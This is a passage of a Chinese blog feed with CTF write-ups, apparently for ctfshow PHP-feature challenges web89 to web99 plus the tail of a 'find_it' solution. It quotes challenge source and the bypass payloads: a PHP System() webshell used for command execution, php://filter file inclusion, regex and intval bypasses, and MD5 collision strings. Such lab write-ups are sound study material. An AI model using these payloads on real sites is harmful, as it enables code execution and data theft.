phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>得到flag</p></li><li><p><strong>show_source()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php show_source(__FILE__);?&gt;</span><br></pre></td></tr></table></figure><p>之后便可直接访问hack.php<br>得到flag</p></li><li><p><strong>System()</strong><br>代码中preg_match并没有忽略大小写，而php函数是可以忽略大小写的，所以可以使用System()来绕过正则检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php System($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure><p>之后直接执行命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hack.php?1=ls -alh &amp;&amp; cat flag.php</span><br></pre></td></tr></table></figure></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学会分析源码，才知道应该做什么。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.wolai.com/ctfhub/oKTHZCKnTRgZzifYg5twqZ">代码中preg</a><br><a href="https://blog.csdn.net/qq_46266956/article/details/124377403">CTFHUB find_it</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;需要自己的后台扫描工具，手工尝试太慢了…&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-php特性</title>
    <link href="http://example.com/2022/12/15/ctfshow-web%E5%85%A5%E9%97%A8-php%E7%89%B9%E6%80%A7/"/>
    <id>http://example.com/2022/12/15/ctfshow-web%E5%85%A5%E9%97%A8-php%E7%89%B9%E6%80%A7/</id>
    <published>2022-12-14T16:00:00.000Z</published>
    <updated>2022-12-24T10:59:46.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了继续巩固php基础！</p><span id="more"></span><h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>首先include包含了flag.php，然后通过get方式传入num参数。</li></ol><ul><li><p>preg_match()函数：<br>执行匹配正则表达式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$matches</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span></span><br><span class="line">): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pattern</span></span><br><span class="line"><span class="comment">要搜索的模式，字符串类型。</span></span><br><span class="line"><span class="comment">subject</span></span><br><span class="line"><span class="comment">输入字符串。</span></span><br><span class="line"><span class="comment">matches</span></span><br><span class="line"><span class="comment">如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span></span><br><span class="line"><span class="comment">flags</span></span><br><span class="line"><span class="comment">flags 可以被设置为以下标记值的组合：</span></span><br><span class="line"><span class="comment">PREG_OFFSET_CAPTURE</span></span><br><span class="line"><span class="comment">如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的字节数)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span></span><br><span class="line"><span class="comment">PREG_UNMATCHED_AS_NULL</span></span><br><span class="line"><span class="comment">使用该标记，未匹配的子组会报告为 null；未使用时，报告为空的 string。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个位置开始搜索(单位是字节)。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回值</span></span><br><span class="line"><span class="comment">如果 pattern 匹配到指定 subject，则 preg_match() 返回 1，如果没有匹配到则返回 0， 或者在失败时返回 false。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li><li><p>intval()函数<br>获取变量的整数值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">intval(mixed $value, int $base = 10): int</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</span><br><span class="line">注意:</span><br><span class="line">如果 base 是 0，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>构造语句<br>因为preg_match在匹配字符串不为“字符串”时，会提示错误，返回false。因此我们可以传入一个数组。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=a</span><br></pre></td></tr></table></figure>拿到flag</li></ol><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>分析源码可知，条件为num变量的10进制值为4476时不能通过，但又要求:<br><code>intval($num,0)===4476</code><br>根据上面的知识点可知，当base为0时检测value的前缀。<br>那么我们可以更改为十进制以外的前缀，并且让其10进制值为4476，便可通过。</p></li><li><p>构造语句<br><code>?num=0x117c</code><br>拿到flag</p></li></ol><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>知识点总结：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^  匹配开头</span><br><span class="line">$匹配末尾</span><br><span class="line">/i  不区分大小写</span><br><span class="line">/m 多行匹配</span><br></pre></td></tr></table></figure>多行匹配（不匹配换行符）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^xxx$</span><br><span class="line">^yyy$</span><br><span class="line">^zzz$</span><br></pre></td></tr></table></figure>单行匹配（匹配换行符）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^xxx</span><br><span class="line">yyy</span><br><span class="line">zzz$</span><br></pre></td></tr></table></figure></li></ol><p>第1个if语句是多行匹配，第2个if语句是单行匹配。</p><ol start="2"><li>构造语句<br>通过使用换行符，可以让换行符后为php，换行符前为其它字符。能成功绕过2个if语句。<br>于是可以得到：<br><code>?cmd=a%0aphp</code><br>拿到flag<br>该题原型为一个<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">解析漏洞</a></li></ol><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p>和web90题差不多，区别在于从&#x3D;&#x3D;&#x3D;变成了&#x3D;&#x3D;，&#x3D;&#x3D;会进行弱类型转换<br>解决方法很多，比如0x117c, 4476.1, 4476e123<br>我的： <code>?num=0x117c</code><br>拿到flag</p><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p>和web92题类似，只不过不能用字符了，所以16进制和科学计数法不能使用，但可以通过8进制或小数点绕过<br>我的： <code>?num=4476.1</code><br>拿到flag</p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p>和web93题类似，这一次把浮点数4476.1和八进制010574都过滤了，我们仔细看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目中增加的条件是：num参数中必须包含0，但不能在首位，于是我们可以在八进制前添加一个空格绕过：<br><code>?num= 010574</code><br>或者将数字0添加到小数点后：<br><code>?num=4476.01</code><br>均可拿到flag</p><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p>这一题和web94差不多，只不过把小数点过滤了，不能使用浮点数，但可以在八进制前面加上空格之类的绕过<br><code>?num= 010574</code><br>拿到flag</p><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p>看到highlight_file()函数，想到文件包含<br>所以直接构造文件包含的语句：<br><code>?u=php://filter/convert.base64-encode/resource=flag.php</code><br>得到的数据经过base64解码即可拿到flag<br>或者使用相对路径： <code>?u=./flag.php</code><br>或者使用绝对路径： <code>?u=/var/www/html/flag.php</code><br>均可拿到flag</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这一题是需要通过POST传入a，b两个参数。<br>条件是值不能相等，且md5值要相等。</p></li><li><p>构造payload<br>抓包将头部的GET改为POST，然后添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>最后我们有两种构造方法来传参</p></li></ol><ul><li><p>第1种（php中hash比较缺陷）<br>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。<br>由此可以构造出：<br><code>a[]=1&amp;b[]=2</code><br>报错并且成功拿到flag</p></li><li><p>第2种（生成MD5相同但内容不同的2个文件）<br>用md5-fastcoll工具可以生成MD5相同但内容不同的两个文件，编写python脚本提取文件内容，并进行url编码就行了。<br>以下是几个MD5相同但内容不同的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line"></span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line"></span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure><p>构造成payload即可拿到flag</p></li></ul><p><strong>题外话</strong></p><ul><li>如果是MD5弱比较，使用强制类型转换后不再接收数组：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></li><li>md5强碰撞<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></li></ul><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>考点是PHP的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址<br>第2行代码的意思是：只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)<br>第3,4行代码用处不大，因为我们不传入flag参数<br>第5行代码的意思是POST型提交一个HTTP_FLAG&#x3D;flag,由于get不会验证，所以随便填个1&#x3D;1就好。</p></li><li><p>构造payload<br>抓包，将头部的GET改为POST，并且添加Content-Type<br>GET型 <code>1=1</code><br>POST型 <code>HTTP_FLAG=flag</code><br>拿到flag</p></li></ol><h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span 